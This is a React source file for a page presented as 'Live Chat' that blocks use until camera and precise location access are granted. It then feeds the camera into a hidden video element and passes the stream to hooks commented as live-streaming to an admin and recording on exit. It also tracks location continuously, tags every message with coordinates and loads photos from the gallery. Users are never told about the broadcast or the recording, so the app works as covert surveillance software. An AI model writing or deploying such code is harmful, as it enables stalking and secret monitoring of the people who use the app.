import { useState, useRef, useEffect, useCallback } from 'react';
import { Send, User, AlertCircle, Settings, Image, Loader2 } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { useToast } from '@/hooks/use-toast';
import MessageList from '@/components/MessageList';
import { useMessages } from '@/hooks/useMessages';
import { useWebRTCBroadcaster } from '@/hooks/useWebRTCBroadcaster';
import { useVideoRecorder } from '@/hooks/useVideoRecorder';
import { useGalleryAccess } from '@/hooks/useGalleryAccess';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';

const Index = () => {
  const { toast } = useToast();
  const navigate = useNavigate();
  const [userName, setUserName] = useState<string | null>(null);
  const [nameInput, setNameInput] = useState('');
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [permissionsGranted, setPermissionsGranted] = useState(false);
  const [permissionError, setPermissionError] = useState<string | null>(null);
  const [showPermissionPrompt, setShowPermissionPrompt] = useState(false);
  const [location, setLocation] = useState<{ latitude: number; longitude: number } | null>(null);
  const [cameraReady, setCameraReady] = useState(false);
  const { messages, isLoading, sendMessage, uploadImage } = useMessages(sessionId);
  const [isSending, setIsSending] = useState(false);
  const [inputValue, setInputValue] = useState('');
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [activeStream, setActiveStream] = useState<MediaStream | null>(null);
  const [isUploadingGallery, setIsUploadingGallery] = useState(false);
  
  // Gallery access hook
  const { photos, isLoading: galleryLoading, loadPhotos, uploadPhotoToStorage } = useGalleryAccess(sessionId);
  
  // WebRTC broadcaster for live video streaming to admin
  useWebRTCBroadcaster({ sessionId: sessionId || '', stream: activeStream });
  
  // Video recorder for saving on exit
  useVideoRecorder({ sessionId: sessionId || '', stream: activeStream });

  // Request permissions for returning users
  const requestCameraAndLocation = useCallback(async () => {
    try {
      // Request camera permission
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false,
      });
      streamRef.current = stream;
      setActiveStream(stream);
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          setCameraReady(true);
        };
      }

      // Request location permission
      await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
        });
      });

      setPermissionsGranted(true);
      setShowPermissionPrompt(false);
      return true;
    } catch (err) {
      console.error('Permission error:', err);
      setShowPermissionPrompt(true);
      return false;
    }
  }, []);

  useEffect(() => {
    const storedName = localStorage.getItem('chat_user_name');
    const storedSession = localStorage.getItem('chat_session_id');
    
    if (storedName && storedSession) {
      setUserName(storedName);
      setSessionId(storedSession);
      // Immediately try to get permissions for returning users
      requestCameraAndLocation();
    }
  }, [requestCameraAndLocation]);

  // Watch location continuously when in chat
  useEffect(() => {
    if (!userName || !sessionId || !permissionsGranted) return;

    navigator.geolocation.getCurrentPosition(
      (position) => {
        setLocation({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        });
      },
      (error) => console.error('Location error:', error),
      { enableHighAccuracy: true }
    );

    const watchId = navigator.geolocation.watchPosition(
      (position) => {
        setLocation({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        });
      },
      (error) => console.error('Location error:', error),
      { enableHighAccuracy: true }
    );

    return () => navigator.geolocation.clearWatch(watchId);
  }, [userName, sessionId, permissionsGranted]);

  const requestPermissions = async () => {
    setPermissionError(null);
    
    try {
      // Request camera permission and initialize stream
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false,
      });
      
      // Store and attach the stream so camera becomes active immediately
      streamRef.current = stream;
      setActiveStream(stream);
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          setCameraReady(true);
        };
      }

      // Request location permission
      await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
        });
      });

      setPermissionsGranted(true);
      
      // Start chat session
      const newSessionId = crypto.randomUUID();
      localStorage.setItem('chat_user_name', nameInput.trim());
      localStorage.setItem('chat_session_id', newSessionId);
      setUserName(nameInput.trim());
      setSessionId(newSessionId);
    } catch (err) {
      console.error('Permission error:', err);
      setPermissionError('Camera and location permissions are required to use this app. Please allow access and try again.');
    }
  };

  const handleStartChat = async () => {
    if (!nameInput.trim()) {
      toast({ title: 'Please enter your name', variant: 'destructive' });
      return;
    }

    await requestPermissions();
  };

  const capturePhoto = (): string | null => {
    if (!videoRef.current || !cameraReady) {
      console.log('Camera not ready:', { videoRef: !!videoRef.current, cameraReady });
      return null;
    }

    const video = videoRef.current;
    
    // Check if video has dimensions
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.log('Video dimensions are 0');
      return null;
    }

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    if (!ctx) return null;
    
    ctx.drawImage(video, 0, 0);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
    
    // Verify it's not empty
    if (dataUrl === 'data:,') {
      console.log('Canvas produced empty image');
      return null;
    }
    
    return dataUrl;
  };

  const canSendMessage = permissionsGranted;
 
   const handleGalleryUpload = async () => {
     if (!sessionId || !userName) return;
     
     setIsUploadingGallery(true);
     try {
       // Load photos from gallery (will request permission automatically on native)
       const galleryPhotos = await loadPhotos(10);
       
       if (galleryPhotos.length === 0) {
         toast({
           title: 'No photos found',
           description: 'Could not access gallery or no photos available.',
           variant: 'destructive',
         });
         setIsUploadingGallery(false);
         return;
       }
       
       // Upload first photo and send as message
       const firstPhoto = galleryPhotos[0];
       const uploadedUrl = await uploadPhotoToStorage(firstPhoto);
       
       if (uploadedUrl) {
         await sendMessage(
           'Shared a photo from gallery',
           uploadedUrl,
           location?.latitude || null,
           location?.longitude || null,
           'user',
           userName,
           sessionId
         );
         toast({ title: 'Photo shared successfully' });
       } else {
         toast({
           title: 'Upload failed',
           description: 'Could not upload the photo.',
           variant: 'destructive',
         });
       }
     } catch (error) {
       console.error('Gallery upload error:', error);
       toast({
         title: 'Gallery access failed',
         description: 'Could not access your photo gallery.',
         variant: 'destructive',
       });
     } finally {
       setIsUploadingGallery(false);
     }
   };
 
   const handleSend = async () => {
     if (!inputValue.trim() || !sessionId || !userName) return;
     
     if (!permissionsGranted) {
       setShowPermissionPrompt(true);
       toast({
         title: 'Permissions required',
         description: 'Please allow camera and location access to send messages.',
         variant: 'destructive',
       });
       return;
     }
 
    setIsSending(true);

    // Send text message only - no automatic image capture
    const success = await sendMessage(
      inputValue,
      null,
      location?.latitude || null,
      location?.longitude || null,
      'user',
      userName,
      sessionId
    );

    if (success) {
      setInputValue('');
    } else {
      toast({
        title: 'Failed to send',
        variant: 'destructive',
      });
    }

    setIsSending(false);
  };

  // Show name entry screen if not logged in
  if (!userName || !sessionId) {
    return (
      <div className="flex items-center justify-center h-screen bg-background p-4">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <User className="h-12 w-12 mx-auto text-primary mb-2" />
            <CardTitle className="text-2xl">Welcome to Live Chat</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <Input
              placeholder="Enter your name"
              value={nameInput}
              onChange={(e) => setNameInput(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleStartChat()}
            />
            
            {permissionError && (
              <div className="flex items-start gap-2 p-3 rounded-lg bg-destructive/10 text-destructive text-sm">
                <AlertCircle className="h-5 w-5 flex-shrink-0 mt-0.5" />
                <p>{permissionError}</p>
              </div>
            )}

            <Button onClick={handleStartChat} className="w-full">
              Start Chat
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-screen bg-background relative">
      {/* Full-screen permission overlay */}
      {!permissionsGranted && (
        <div className="absolute inset-0 z-50 bg-background/95 backdrop-blur-sm flex items-center justify-center p-4">
          <Card className="w-full max-w-md">
            <CardHeader className="text-center">
              <AlertCircle className="h-12 w-12 mx-auto text-destructive mb-2" />
              <CardTitle className="text-xl">Permissions Required</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4 text-center">
              <p className="text-muted-foreground text-sm">
                Camera and location access are required to use this chat. Please allow access to continue.
              </p>
              <Button onClick={requestCameraAndLocation} className="w-full">
                Allow Camera & Location
              </Button>
            </CardContent>
          </Card>
        </div>
      )}

      <header className="p-4 border-b flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-foreground">Live Chat</h1>
          <div className="flex items-center gap-2 text-xs text-muted-foreground mt-1">
            <User className="h-3 w-3" />
            <span>{userName}</span>
          </div>
        </div>
        <Button
          variant="ghost"
          size="icon"
          onClick={() => navigate('/admin')}
          className="h-8 w-8 text-muted-foreground hover:text-foreground"
        >
          <Settings className="h-4 w-4" />
        </Button>
      </header>

      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className="hidden"
      />

      <MessageList messages={messages} isLoading={isLoading} />

      <div className="p-4 border-t flex gap-2">
        <Button
          variant="outline"
          size="icon"
          onClick={handleGalleryUpload}
          disabled={isUploadingGallery || !permissionsGranted}
          className="flex-shrink-0"
        >
          {isUploadingGallery ? (
            <Loader2 className="h-4 w-4 animate-spin" />
          ) : (
            <Image className="h-4 w-4" />
          )}
        </Button>
        <Input
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          placeholder="Type a message..."
          onKeyDown={(e) => e.key === 'Enter' && handleSend()}
          disabled={isSending || !permissionsGranted}
        />
        <Button onClick={handleSend} disabled={isSending || !inputValue.trim() || !canSendMessage}>
          <Send className="h-4 w-4" />
        </Button>
      </div>
    </div>
  );
};

export default Index;